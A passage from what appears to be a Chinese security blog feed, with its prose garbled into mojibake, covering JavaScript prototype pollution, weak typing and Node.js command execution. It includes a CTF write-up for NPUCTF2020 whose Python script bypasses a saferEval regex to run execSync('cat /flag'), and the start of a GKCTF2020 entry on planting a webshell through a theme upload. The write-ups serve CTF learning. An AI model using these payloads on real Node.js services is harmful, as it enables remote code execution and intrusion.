<p>ç”±ä»£ç å¯çŸ¥ï¼Œå…¨æ–‡æ²¡æœ‰å¯¹user.admintoknè¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥ç†è®ºä¸Šè¿™ä¸ªå€¼æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰ä¸€å¥èµ‹å€¼è¯­å¥ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">matrix[client.row][client.col] = client.data</span><br></pre></td></tr></table></figure>

<p><code>data</code>ï¼Œ<code>row</code>ï¼Œ<code>col</code>ï¼Œéƒ½æ˜¯æˆ‘ä»¬postä¼ å…¥çš„å€¼ï¼Œéƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥æ„é€ åŸå‹é“¾æ±¡æŸ“ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> client = &#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> matrix=[];</span><br><span class="line">matrix[client.row][client.col] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user=[]</span><br><span class="line"><span class="built_in">console</span>.log(user.admintoken)<span class="comment">//test</span></span><br></pre></td></tr></table></figure>

<p>çœ‹æ˜¯å¯ä»¥æˆåŠŸæ§åˆ¶userçš„ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“åŸå‹é“¾æ±¡æŸ“çš„æ¡ä»¶å°±æ˜¯è¦èƒ½å¤Ÿæ§åˆ¶é”®åã€‚</p>
<p>æœ€ç»ˆpayloadï¼Œè¦ä½¿ç”¨jsonä¼ å€¼ï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://target/api&#x27;</span>,json=&#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:<span class="string">&#x27;qqq&#x27;</span>&#125;)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://target/admin?querytoken=&#x27;</span> + md5sumhex(<span class="string">&#x27;qqq&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<h1 id="JSä¸­çš„å¼±ç±»å‹"><a href="#JSä¸­çš„å¼±ç±»å‹" class="headerlink" title="JSä¸­çš„å¼±ç±»å‹"></a><strong>JSä¸­çš„å¼±ç±»å‹</strong></h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]===<span class="number">1</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>æ•°ç»„<code>[1]==1</code>åœ¨ä¸¤ä¸ªç­‰äºå·æ—¶å€™æ˜¯è¿”å›trueçš„ï¼Œè€Œåœ¨ä¸‰ä¸ªç­‰äºå·æ—¶å€™ä¼šè¿”å›falseï¼Œè¿™ä¸€ç‚¹æ˜¯å’Œphpä¸€æ ·çš„ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;str-1&quot;</span></span><br><span class="line"><span class="keyword">var</span> c = a+b</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(c)<span class="comment">//[object Object]str-1</span></span><br></pre></td></tr></table></figure>

<p>å¯¹è±¡å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„æ˜¯å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a+b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(a+b)<span class="comment">//1,2,3haha</span></span><br></pre></td></tr></table></figure>

<p>æ•°ç»„å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åä¹Ÿæ˜¯å¾—åˆ°å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åŸºæœ¬å¾—å‡ºç»“è®ºå°±æ˜¯ï¼Œ<strong>nodeJsä¸­ä»»ä½•æ•°æ®ç±»å‹å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„éƒ½æ˜¯å­—ç¬¦ä¸²</strong>ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(num.length)<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(str.length)<span class="comment">//5</span></span><br><span class="line"><span class="built_in">console</span>.log(b.length)<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>é•¿åº¦<code>length</code> å±æ€§å¯¹äºå­—ç¬¦ä¸²æ˜¯è¿”å›å­—ç¬¦ä¸²é•¿åº¦ï¼Œè€Œæ•°ç»„æ˜¯è¿”å›æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è€Œæ•°å­—æ˜¯æ²¡æœ‰<code>length</code> çš„ã€‚</p>
<h1 id="æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ"><a href="#æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ"></a><strong>æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ</strong></h1><p>åœ¨ä¸€äº›æ²™ç›’é€ƒé€¸æ—¶æˆ‘ä»¬é€šå¸¸æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„payloadï¼Œè‹¥æ˜¯åœ¨ctfæ¯”èµ›ä¸­ï¼Œæˆ‘ä»¬éœ€è¦getflagæ—¶é€šå¸¸æ˜¯éœ€è¦æƒ³å°½åŠæ³•åŠ è½½æ¨¡å—æ¥è¾¾æˆç‰¹æ®Šè¦æ±‚ã€‚</p>
<p>æ¯”èµ›ä¸­å¸¸è§å¯ä»¥é€šè¿‡<code>child_process</code>æ¨¡å—æ¥åŠ è½½æ¨¡å—ï¼Œè·å¾—<code>exec</code>ï¼Œ<code>execfile</code>ï¼Œ<code>execSync</code>ã€‚</p>
<ul>
<li>é€šè¿‡requireåŠ è½½æ¨¡å—å¦‚ä¸‹</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡globalå¯¹è±¡åŠ è½½æ¨¡å—</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸€äº›ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰requireçš„æƒ…å†µä¸‹ï¼Œé€šå¸¸æ˜¯æƒ³åŠæ³•ä½¿ç”¨åè€…æ¥åŠ è½½æ¨¡å—ï¼Œäº‹å®ä¸Šï¼ŒNodeJsçš„<code>Function()</code>å¹¶ä¸èƒ½æ‰¾åˆ°requireè¿™ä¸ªå‡½æ•°ã€‚</p>
<p>æœ‰äº›æƒ…å†µä¸‹å¯ä»¥ç›´æ¥ç”¨requireï¼Œå¦‚<code>eval()</code>ã€‚</p>
<p>ä»£ç æ‰§è¡Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">Function</span>(<span class="string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>)();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å‘ç°å¯¹äºFunctionæ¥è¯´ä¸Šä¸‹æ–‡å¹¶ä¸å­˜åœ¨requireï¼Œéœ€è¦ä»globalä¸­ä¸€è·¯è°ƒå‡ºæ¥execã€‚</p>
<h1 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a><strong>[NPUCTF2020]éªŒè¯ğŸ</strong></h1><p>é¢˜ç›®æºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°saferEvalå‡½æ•°ï¼Œæˆ‘ä»¬çœ‹åˆ°åªè¦ç»•è¿‡æ­£åˆ™ä¹‹åå°±å¯ä»¥åˆ©ç”¨åœ¨ä»£ç æ‰§è¡Œå¤„æ‰€è¯´çš„evalæ¥æ‰§è¡Œä»£ç ã€‚</p>
<p>çœ‹åˆ°è°ƒç”¨äº†saferEvalçš„åœ°æ–¹æœ‰ä¸€ä¸ªç»•è¿‡ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°å¼±ç±»å‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>æƒ³è¦<code>first</code> å’Œ<code>second</code> é•¿åº¦ä¸€æ ·è€Œä»–ä»¬å†…å®¹åˆä¸ç›¸ç­‰ï¼Œä½†æ˜¯ä»–ä»¬md5åŠ ç›åçš„å€¼åˆè¦ç›¸ç­‰ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹payloadã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;e&quot;</span>:payload,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨äº†<strong>ä»»ä½•æ•°æ®ç±»å‹åŠ ä¸Šå­—ç¬¦ä¸²éƒ½ä¼šè½¬å˜ç§°ä¸ºå­—ç¬¦ä¸²çš„ç‰¹æ€§</strong>ã€‚åŒæ—¶æ•°ç»„å’Œå­—ç¬¦ä¸²çš„é•¿åº¦éƒ½æ˜¯1ä½†æ˜¯ä»–ä»¬å´ä¸å…¨ç­‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;e&quot;</span>:<span class="string">&#x27;1+1&#x27;</span>,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><code>saferEval</code>éƒ¨åˆ†æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ç®­å¤´å‡½æ•°é…åˆMathé€šè¿‡åŸå‹è·å–åˆ°Functionï¼Œä½¿ç”¨ä¸Šé¢æåˆ°çš„Functionï¼Œé€šè¿‡globalä¸€è·¯è°ƒå‡ºæ¥execæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>=&gt;(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor)</span><br></pre></td></tr></table></figure>

<p><code>Math=&gt;</code>å…¶å®æ˜¯ä¸ªåŒ¿åå‡½æ•°ï¼Œçœ‹å‡ ä¸ªä¾‹å­</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x =&gt; x * x</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function">//<span class="title">a</span> = <span class="title">x</span> =&gt; <span class="title">x</span>*<span class="title">x</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span>(<span class="params">(x=&gt;x+x)(<span class="number">2</span>)</span>)//4</span></span><br></pre></td></tr></table></figure>

<p>åé¢æ˜¯ä¸€ä¸ªé€—å·è¿ç®—ï¼Œé€—å·è¿ç®—æˆ‘ä»¬çŸ¥é“æ˜¯ä»å·¦å¾€å³è¿ç®—å†æœ€åè¿”å›æœ€å³è¾¹çš„å€¼ï¼Œæˆ‘ä»¬ç”±æ­¤å¾—çŸ¥è¿™é‡Œæ˜¯æ‰§è¡Œè¿™ä¹ˆä¸ªè¿ç®—ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.constructor.constructor(.....)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor)<span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor.constructor)<span class="comment">//[Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>Functionæ˜¯æ„é€ å‡½æ•°ä»–èƒ½å¤Ÿåˆ›å»ºå‡½æ•°ï¼Œå¯ä»¥ç®€å•ç†è§£ä»–å’Œevalç±»ä¼¼ï¼Œæµ‹è¯•ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="built_in">Math</span>.constructor.constructor(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br><span class="line"><span class="built_in">console</span>.log(fun(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p><code>Math.constructor.constructor()</code> å’Œæ„é€ å‡½æ•°<code>new Function()</code> æ˜¯ç­‰æ•ˆçš„ï¼Œå½“ç„¶å…¶ä»–ä»»æ„å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>è¿™æ ·è™½ç„¶å¯ä»¥å¾—åˆ°Functionï¼Œä½†é™äºæ­£åˆ™æˆ‘ä»¬æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œç»•è¿‡é‡‡ç”¨String.fromCharCodeï¼ŒStringå¯ä»¥é€šè¿‡å˜é‡æ‹¼æ¥æ‹¼æ¥å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨constructorè·å–åˆ°Stringå¯¹è±¡ã€‚</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>():</span></span><br><span class="line">    s = <span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">a = payload()</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot;Start the program:&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">e = <span class="string">&quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;</span>.format(a)</span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;e&#x27;</span>: e, <span class="string">&quot;first&quot;</span>: [<span class="number">1</span>], <span class="string">&quot;second&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line">r = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a><strong>å‚è€ƒé“¾æ¥</strong></h1><p><a class="foo" href="https://www.plasf.cn/2020/04/24/JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°/#èµ„æº" target="_blank">JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7182#toc-5" target="_blank">æµ…æjavascriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7752" target="_blank">nodejsä¸€äº›å…¥é—¨ç‰¹æ€§&amp;&amp;å®æˆ˜</a></p>
<p><a class="foo" href="https://www.plasf.cn/2020/04/25/Nodeä¸“é¢˜è®­ç»ƒ-1" target="_blank">NPUCTF2020 éªŒè¯ğŸ</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF2020</title>
    <url>/2020/06/01/GKCTF%202020/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h4><p>æŠ½ç©ºå¤ç°ä¸€ä¸‹</p>
<h4 id="è€å…«å°è¶…å¸‚"><a href="#è€å…«å°è¶…å¸‚" class="headerlink" title="è€å…«å°è¶…å¸‚"></a><strong>è€å…«å°è¶…å¸‚</strong></h4><p>æ‰“å¼€ä¹‹åæ˜¯ä¸ªshopxoçš„å•†åŸï¼Œç”¨é»˜è®¤åå°è´¦å·å¯†ç ç™»å½•ï¼ŒæˆåŠŸè¿›å…¥åå°ã€‚</p>
<p>ä¸‹è½½å…è´¹çš„ä¸»é¢˜ï¼ŒæŠŠä¸€å¥è¯æœ¨é©¬æ”¾è¿›å»ã€‚</p>
<p>å®‰è£…ä¸»é¢˜ï¼Œå³å¯getshell</p>
<p>å‚è€ƒï¼š<a class="foo" href="http://www.nctry.com/1660.html" target="_blank">ä¼ é€é—¨</a></p>
<p>ç„¶ååœ¨å‡flagå‘ŠçŸ¥ä¸‹å¾—çŸ¥çœŸflagåœ¨/rootç›®å½•ä¸‹ï¼Œä½†æ˜¯å› ä¸ºå½“å‰æ˜¯www-dataç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™è®¿é—®/rootç›®å½•çš„ã€‚</p>
<p>ç„¶ååœ¨æ ¹ç›®å½•ä¸‹å‘ç°auto.sh</p>
<img src="http://img.kawhi.xyz/image-20200526220703847.png" style="high:80%;width:80%;" />

<img src="http://img.kawhi.xyz/image-20200526220146582.png" style="high:80%;width:80%;" />

